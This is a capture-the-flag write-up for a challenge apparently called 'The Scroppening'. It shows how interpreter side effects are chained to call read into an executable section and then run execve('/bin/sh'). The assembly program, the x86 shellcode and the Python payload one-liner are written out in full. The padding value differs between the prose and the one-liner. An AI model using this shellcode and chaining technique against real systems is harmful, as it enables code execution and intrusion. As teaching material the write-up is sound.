# SIGBOVIK III - The Scroppening Writeup

The win function has been removed! We're in real ropchain land now.
Again, you are provided access to the assembler rather than the interpreter, so you must write
a valid scrop assembly program.

This is solveable a number of ways, our solution (thank you Ben Kallus) is a read -> shellcode -> shell pathway.
We would like to call read(stdin, <location>, 4096) to read a bunch of code into the RWX code section of the interpreter.
We will accomplish this by abusing side-effects caused by bits and pieces of the interpreter code.
AKA, we are using benign behaviors to construct a malicious payload.

First, we make a lambda with code offset 4096 (we are trying to get this value into rdx for read).
Then, we make a vector containing the number 1, and then overwrite it with `0x8008000 >> 2` so that we get 0x8008000 in rsi.
Then we execute an ADD instruction with no operands, which will zero rdi (the value of stdin).
Finally, we do our familiar PRIMAPPLY to jump to the location of the read syscall embedded in the interpreter (this is very easy to find by objdumping and searching for syscall instructions).

Our program looks like:

```
LOAD 0
VECTOR
LOAD 0
LAMBDA 4096
LOAD 1
LOAD 1
VECTOR
LOAD 1
LOAD 33562624
VECTORSET
LOAD 0
ADD
LOAD NULL
LOAD NULL
LOAD NULL
PRIMAPPLY 0X80087bf
DONE
```

We will pass this over netcat, which will assemble and interpret our code, which is now running the syscall read(stdin, 0x8008000, 4096), which means now we can write code into the text section!

At this point, RIP should be 0x80087c8 (the return instruction in the read syscall wrapper).
So, let's feed in "/bin/sh" padded to 0x7c8 characters of null bytes, and then some standard shellcode to call execve:

```
mov eax, 59
mov edi, 0x8008000
xor esi, esi
xor edx, edx
syscall
```

We can assemble this and pass it over netcat like so:

```
python3 -c 'import os; os.write(1, b"/bin/sh".ljust(0x7a8, b"\x00") + b"\xb8\x3b\x00\x00\x00\xbf\x00\x80\x00\x08\x31\xf6\x31\xd2\x0f\x05")'; cat)
```

This calls execve, and we have now popped a shell, where we can `cat flag.txt`!

